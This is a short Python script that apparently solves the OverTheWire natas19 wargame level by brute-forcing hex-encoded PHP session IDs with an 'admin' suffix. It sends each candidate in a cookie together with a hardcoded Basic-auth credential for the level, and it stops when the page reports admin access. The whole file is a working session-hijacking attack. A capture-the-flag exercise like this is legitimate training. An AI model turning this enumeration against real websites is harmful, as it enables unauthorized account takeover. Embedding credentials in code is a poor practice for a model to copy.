import requests
import sys

url = "http://natas19.natas.labs.overthewire.org"
magic_content = "You are an admin"
wrong_content = "You are logged in as a regular user"

for i in range(10):
    for j in range(10):
        for h in range(10):
            payload = {"username": "admin", "password": "pass"}
            phpSessionId= "3{0}3{1}3{2}2d61646d696e".format(i, j, h)
            headers = {"Cookie": "PHPSESSID={0}".format(phpSessionId), "Authorization": "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=="}
            resp = requests.post(url, params=payload, headers=headers)
            if magic_content in resp.content:
                print("Solved: " + resp.content)
                sys.exit()
            elif wrong_content in resp.content:
                print("Tried for " + phpSessionId)
            else:
                print("Failed to solved: " + resp.content)
                sys.exit()
